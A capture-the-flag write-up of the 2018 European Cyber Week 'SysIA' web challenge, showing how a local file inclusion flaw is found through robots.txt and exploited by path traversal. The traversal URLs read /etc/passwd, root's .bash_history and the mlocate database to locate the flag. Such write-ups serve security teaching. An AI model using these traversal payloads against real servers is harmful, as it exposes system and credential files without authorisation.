# [European Cyber Week] - SysIA


## State of the art

A nice cyber-hacker-haxxor-website-of-death containing a magical `robots.txt` file:

```
User-agent: *
Disallow: /notinterestingfile.php
```

## Local file include


![](/lib/images/writeups/2018_ecw/sysia/sysia_1.png)


Let's try something:

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../etc/passwd

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false
```

Ok, it works, there is only one user with a /bin/bash. I can't display any other web page via LFI, I think I'll try to display the `.bash_history`:

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../root/.bash_history

It worked (I will just put a snippet below because it's veeeeery long):

```
docker exec -it CTFd_NDH_2018 /bin/sh
ll
mkdir ndh
cd ndh/
locate flag.txt
updatedb
locate flag.txt
ll
nano Dockerfile
nano proxy.py
docker build . -n CTFd_ndh
```

## Flag location

Ok, he did an `updatedb`, so the location of `flag.txt` is stored in this database. The default path is: `/var/lib/mlocate/mlocate.db`

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/lib/mlocate/mlocate.db


![](/lib/images/writeups/2018_ecw/sysia/sysia_2.png)


## Flag

> https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/www/ECW/solution/web/lfi/flag.txt


![](/lib/images/writeups/2018_ecw/sysia/sysia_3.png)

